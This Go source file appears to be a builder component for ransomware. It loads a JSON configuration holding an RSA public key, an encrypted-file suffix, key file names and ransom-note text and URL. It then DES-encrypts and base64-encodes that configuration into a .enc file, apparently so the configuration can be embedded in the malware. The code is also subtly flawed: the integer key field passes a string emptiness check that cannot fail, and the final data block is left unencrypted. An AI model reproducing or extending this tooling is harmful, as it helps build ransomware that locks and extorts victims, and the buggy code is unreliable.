package main

import (
	"crypto/des"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"encoding/json"
	"strings"
	"reflect"
)

type Config struct {
	PubKeyN string
	PubKeyE int

	Filesuffix   string
	KeyFilename  string
	DkeyFilename string

	Readme         string
	ReadmeFilename string

	ReadmeUrl         string
	ReadmeNetFilename string

	EncSuffix string
}

func (self *Config) init(data []byte) {
	err := json.Unmarshal(data, self)
	if err != nil {
		fmt.Println("[Error] Cannot load JSON data.")
		os.Exit(213)
	}
}

func (self *Config) nE(test string) bool {
	if strings.TrimSpace(reflect.ValueOf(self).Elem().FieldByName(test).String()) != "" {
		return true
	}
	return false
}

func (self *Config) check() {
	notEmptyList := []string{"PubKeyN", "PubKeyE", "Filesuffix", "KeyFilename", "DkeyFilename", "Readme", "ReadmeFilename", "EncSuffix"}
	for _, k := range notEmptyList {
		if !self.nE(k) {
			fmt.Println("[Error] Config field", k, "can not be empty.")
			os.Exit(213)
		}
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: ", os.Args[0], "<DES key(8 bytes)>", "<JSON file to encrypt>")
		return
	}
	if len(os.Args[1]) != 8 {
		fmt.Println("[Error] Wrong DES key.")
		return
	}
	cip, _ := des.NewCipher([]byte(os.Args[1]))
	data, err := ioutil.ReadFile(os.Args[2])
	if err != nil {
		fmt.Println("[Error] Cannot open JSON file:", os.Args[2])
		return
	}
	var settings Config
	settings.init(data)
	settings.check()

	for offset := 0; len(data)-offset > 8; offset += 8 {
		cip.Encrypt(data[offset:offset+8], data[offset:offset+8])
	}
	bE := base64.StdEncoding
	target := bE.EncodeToString(data)

	ioutil.WriteFile(os.Args[2]+".enc", []byte(target), 0)
}
